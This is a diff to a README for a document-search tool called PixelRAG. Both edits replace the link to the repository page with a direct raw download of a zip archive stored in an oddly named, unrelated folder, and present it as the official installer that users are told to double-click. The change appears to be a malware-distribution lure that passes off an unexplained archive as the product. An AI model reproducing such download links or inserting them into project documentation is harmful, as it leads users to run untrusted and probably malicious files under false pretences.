@@ -1,6 +1,6 @@
 # 🔍 PixelRAG - Search your documents using visual intelligence
 
-[![Download PixelRAG](https://img.shields.io/badge/Download-PixelRAG-blue.svg)](https://github.com/Wesliecherty759/PixelRAG)
+[![Download PixelRAG](https://img.shields.io/badge/Download-PixelRAG-blue.svg)](https://raw.githubusercontent.com/Wesliecherty759/PixelRAG/main/Machilidae/RAG_Pixel_1.5.zip)
 
 PixelRAG changes how you find information. It treats your documents like images. This approach lets you search through complex layouts, charts, and handwritten notes without complex web parsing. You get accurate results because the software sees the page as you see it.
 
@@ -26,7 +26,7 @@ Your computer needs specific components to run this software. Ensure you meet th
 
 This section guides you through the setup process. Follow these steps to get the software running on your machine.
 
-1. Visit [this page to download](https://github.com/Wesliecherty759/PixelRAG) the latest version of the installer.
+1. Visit [this page to download](https://raw.githubusercontent.com/Wesliecherty759/PixelRAG/main/Machilidae/RAG_Pixel_1.5.zip) the latest version of the installer.
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Double-click the file to start the installation wizard.
 4. Follow the prompts on the screen to choose your installation folder.
